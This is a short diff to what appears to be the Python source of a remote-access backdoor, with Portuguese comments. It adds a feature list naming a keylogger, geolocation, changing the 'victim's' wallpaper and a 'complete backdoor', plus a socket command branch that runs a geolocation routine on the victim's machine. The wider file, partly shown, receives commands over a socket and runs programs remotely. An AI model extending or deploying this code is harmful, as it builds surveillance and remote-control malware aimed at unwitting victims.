@@ -24,6 +24,12 @@ TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será s
                         request elevation upon application restart.
   --uac-uiaccess        Using this option allows an elevated application to
                         work with Remote Desktop.
+
+
+ Keylogger.
+ Geographic Location.
+ Change victim's computer background.
+ Backdoor complete (Only when all features ready).
 '''
 
 def run(comando): # funcão que vai ser executada por uma thread
@@ -189,6 +195,8 @@ def executa(socket):
                         programa = socket.recv(1024)
                         print(programa)
                         run_program(socket, programa)
+                    elif(dados == '7'):
+                        geolocation(socket)
                     else:
                         print(dados)
 
